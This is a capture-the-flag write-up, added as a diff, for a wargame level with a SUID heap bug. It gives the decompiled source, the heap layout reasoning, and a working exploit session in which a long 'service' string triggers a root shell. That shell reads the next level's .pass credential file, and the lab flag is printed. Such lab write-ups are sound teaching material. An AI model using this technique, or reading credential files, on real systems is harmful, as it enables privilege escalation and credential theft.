@@ -1,0 +1,104 @@
+# Level 8
+
+Binary: 32-bit ELF, SUID level9, dynamically linked.
+
+## Analysis
+
+### Ghidra output (simplified)
+
+```c
+char *auth = NULL;
+char *service = NULL;
+
+int main(void) {
+    char buf[128];
+    for (;;) {
+        printf("%p, %p \n", auth, service);
+        if (!fgets(buf, 128, stdin)) return 0;
+
+        if (memcmp(buf, "auth ", 5) == 0) {
+            auth = malloc(4);
+            auth[0] = '\0';
+            if (strlen(buf + 5) < 0x1f)
+                strcpy(auth, buf + 5);
+        }
+        if (memcmp(buf, "reset", 5) == 0) {
+            free(auth);
+        }
+        if (memcmp(buf, "service", 6) == 0) {
+            service = strdup(buf + 7);
+        }
+        if (memcmp(buf, "login", 5) == 0) {
+            if (*(int *)(auth + 0x20) == 0)
+                fwrite("Password:\n", 1, 10, stdout);
+            else
+                system("/bin/sh");
+        }
+    }
+}
+```
+
+A mini REPL with four commands. To win, the 4 bytes at `auth + 0x20` must be non-zero when `login` runs.
+
+## Heap layout
+
+When `auth` and `service` are both set via the commands:
+
+```
+chunk auth    at 0x0804a000  [8B header][8B data]    → auth    = 0x0804a008
+chunk service at 0x0804a010  [8B header][NB data]    → service = 0x0804a018
+```
+
+The allocator puts chunks consecutively. The auth chunk is minimum-size (16 bytes total for a 4-byte request). The service chunk comes right after.
+
+`auth + 0x20` = `0x0804a008 + 0x20` = `0x0804a028`
+
+That address is **16 bytes into service's data area** (service + 0x10).
+
+So if the service string is at least 17 characters long, the bytes at `auth + 0x20` are my own data → non-zero → system("/bin/sh").
+
+## Exploit
+
+```
+$ ./level8
+(nil), (nil)
+auth AAAA
+0x804a008, (nil)
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+The `auth`/`service` addresses printed in the prompt confirm the layout:
+- auth at `0x804a008`
+- service at `0x804a018` (exactly 0x10 = 16 bytes after auth)
+- auth+0x20 = 0x804a028 sits inside service's data area
+
+Flag: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
+
+## Notes
+
+### Why 17+ characters for service?
+
+service's data starts at 0x0804a018. The check reads `auth + 0x20` = `0x0804a028`. That's at index 16 into service's data (0x028 - 0x018 = 0x10 = 16).
+
+For byte 16 of service to be non-zero, the string must be at least 17 chars (index 16 exists and is data, not the null terminator).
+
+Used 30 A's to be safe.
+
+### Why not overflow auth via strcpy?
+
+The strcpy is gated by `strlen(input) < 0x1f` (31). With max 30 chars + null = 31 bytes written starting at auth (address 0x0804a008), we reach 0x0804a027. That's one byte short of auth+0x20. So the overflow path doesn't reach the check location.
+
+Using service sidesteps this: the strdup chunk lives right after auth, and its data covers that address.
+
+### The `/bin/sh` string
+
+Confirmed with GDB:
+
+```
+(gdb) x/s 0x8048833
+0x8048833: "/bin/sh"
+```
